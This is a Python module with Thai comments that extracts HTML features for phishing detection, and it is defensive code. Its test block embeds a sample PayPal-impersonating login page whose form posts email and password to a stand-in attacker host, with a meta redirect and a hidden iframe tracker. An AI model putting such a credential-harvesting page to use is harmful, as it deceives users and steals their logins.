"""
html_extractor.py
ดึง features จาก HTML สำหรับ phishing detection
รับ input ได้ 2 แบบ: URL จริง หรือ HTML string โดยตรง
"""

import re
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup


def _get_domain(url: str) -> str:
    """ดึง hostname จาก URL"""
    try:
        return urlparse(url).hostname or ""
    except Exception:
        return ""


def _fetch_html(url: str) -> str:
    """ดึง HTML จาก URL จริง — timeout 10 วินาที คืน string ว่างถ้าล้มเหลว"""
    try:
        headers = {"User-Agent": "Mozilla/5.0 (compatible; PhishingDetector/1.0)"}
        resp = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        resp.raise_for_status()
        return resp.text
    except requests.exceptions.Timeout:
        raise TimeoutError(f"URL ไม่ตอบสนองภายใน 10 วินาที: {url}")
    except requests.exceptions.RequestException as e:
        raise ConnectionError(f"ดึง HTML ไม่ได้: {e}")


def extract_html_features(url: str = "", html: str = "") -> dict:
    """
    ดึง features จาก HTML content

    Args:
        url:  URL ของเว็บ (จะดึง HTML อัตโนมัติ)
        html: HTML string โดยตรง (ใช้สำหรับ test หรือถ้ามี HTML อยู่แล้ว)

    Returns:
        dict ของ 14 features สำหรับ phishing detection model

    Raises:
        ValueError:      ถ้าไม่ได้ส่ง url หรือ html มาเลย
        TimeoutError:    ถ้า URL ไม่ตอบสนองภายใน 10 วินาที
        ConnectionError: ถ้าดึง HTML ไม่ได้
    """
    if not url and not html:
        raise ValueError("ต้องส่ง url หรือ html อย่างน้อยหนึ่งอย่าง")

    # ดึง HTML จาก URL ถ้ายังไม่มี html string
    if not html:
        html = _fetch_html(url)

    page_domain = _get_domain(url)
    soup = BeautifulSoup(html, "html.parser")

    # --- Links ---
    anchors = soup.find_all("a", href=True)
    num_external_links = 0
    num_internal_links = 0
    num_null_links = 0

    for a in anchors:
        href = (a.get("href") or "").strip()
        if href in ("#", "", "javascript:void(0)", "javascript:;"):
            num_null_links += 1
        elif href.startswith(("http://", "https://")):
            # เปรียบ domain — ถ้าต่างจาก page domain ถือว่า external
            if page_domain and _get_domain(href) != page_domain:
                num_external_links += 1
            else:
                num_internal_links += 1
        else:
            # relative URL = internal
            num_internal_links += 1

    total_links = num_external_links + num_internal_links + num_null_links
    external_link_ratio = round(num_external_links / total_links, 4) if total_links > 0 else 0.0
    null_links_ratio = round(num_null_links / total_links, 4) if total_links > 0 else 0.0

    # --- Media & Embeds ---
    num_images = len(soup.find_all("img"))
    num_scripts = len(soup.find_all("script"))
    num_iframes = len(soup.find_all("iframe"))

    # --- Favicon — phishing มักใช้ favicon ของแบรนด์จริงเพื่อสร้างความน่าเชื่อถือ ---
    favicon_tags = soup.find_all("link", rel=lambda r: r and "icon" in " ".join(r).lower())
    has_favicon = int(len(favicon_tags) > 0)

    # --- Title vs Domain — phishing มักมี title ที่ไม่ตรงกับ domain จริง ---
    title_tag = soup.find("title")
    title_text = title_tag.get_text(strip=True).lower() if title_tag else ""
    # ตรวจว่า registered domain (ไม่รวม subdomain) ปรากฏใน title
    registered = page_domain.split(".")[-2] if page_domain and page_domain.count(".") >= 1 else page_domain
    title_match_domain = int(bool(registered and registered in title_text))

    # --- Login Form — form ที่มี password input ถือว่าเป็น login form ---
    has_login_form = 0
    for form in soup.find_all("form"):
        input_types = [i.get("type", "text").lower() for i in form.find_all("input")]
        if "password" in input_types:
            has_login_form = 1
            break

    # --- Form Action External — form ส่งข้อมูลไป domain อื่น = อันตรายมาก ---
    form_action_external = 0
    for form in soup.find_all("form"):
        action = (form.get("action") or "").strip()
        if action.startswith(("http://", "https://")):
            if page_domain and _get_domain(action) != page_domain:
                form_action_external = 1
                break

    # --- Copyright — phishing page มักไม่มี copyright (ลืม copy หรือตัดออก) ---
    page_text = soup.get_text(separator=" ").lower()
    has_copyright = int(
        "©" in html or "&copy;" in html.lower() or "copyright" in page_text
    )

    # --- Meta Refresh — redirect อัตโนมัติ มักใช้ใน phishing เพื่อ redirect หลัง harvest ---
    meta_refresh = int(any(
        "refresh" in (m.get("http-equiv") or "").lower()
        for m in soup.find_all("meta")
    ))

    # --- Hidden Elements — ซ่อน content หรือ tracker โดย user ไม่รู้ตัว ---
    num_hidden_elements = 0
    for tag in soup.find_all(True):
        style = (tag.get("style") or "").replace(" ", "").lower()
        if (tag.get("hidden") is not None or
                "display:none" in style or
                "visibility:hidden" in style):
            num_hidden_elements += 1

    return {
        "num_external_links": num_external_links,
        "num_internal_links": num_internal_links,
        "external_link_ratio": external_link_ratio,
        "num_images": num_images,
        "num_scripts": num_scripts,
        "num_iframes": num_iframes,
        "has_favicon": has_favicon,
        "title_match_domain": title_match_domain,
        "has_login_form": has_login_form,
        "form_action_external": form_action_external,
        "null_links_ratio": null_links_ratio,
        "has_copyright": has_copyright,
        "meta_refresh": meta_refresh,
        "num_hidden_elements": num_hidden_elements,
    }


if __name__ == "__main__":
    phishing_html = """
    <html>
    <head>
        <title>PayPal - Secure Login</title>
        <link rel="icon" href="https://www.paypal.com/favicon.ico">
        <meta http-equiv="refresh" content="0;url=http://evil.tk/steal">
    </head>
    <body>
        <form action="http://evil.tk/collect" method="POST">
            <input type="email" name="email">
            <input type="password" name="pass">
            <input type="hidden" name="tok" value="abc123">
            <input type="submit" value="Log In">
        </form>
        <a href="#">Terms</a>
        <a href="javascript:void(0)">Privacy</a>
        <a href="https://other-evil.com/phish">Click here</a>
        <iframe src="http://tracker.evil.tk" width="0" height="0"></iframe>
        <div style="display:none">hidden tracker</div>
        <img src="https://paypal.com/logo.png">
    </body>
    </html>
    """

    legitimate_html = """
    <html>
    <head>
        <title>Google Search</title>
        <link rel="icon" href="/favicon.ico">
    </head>
    <body>
        <form action="/search" method="GET">
            <input type="text" name="q">
            <input type="submit" value="Search">
        </form>
        <a href="/about">About</a>
        <a href="/privacy">Privacy</a>
        <a href="/terms">Terms</a>
        <img src="/images/logo.png">
        <p>© 2024 Google LLC</p>
    </body>
    </html>
    """

    print("=== Phishing Page ===")
    pf = extract_html_features(url="http://secure-paypal.evil.tk/login", html=phishing_html)
    for k, v in pf.items():
        print(f"  {k}: {v}")

    print("\n=== Legitimate Page ===")
    lf = extract_html_features(url="https://www.google.com", html=legitimate_html)
    for k, v in lf.items():
        print(f"  {k}: {v}")
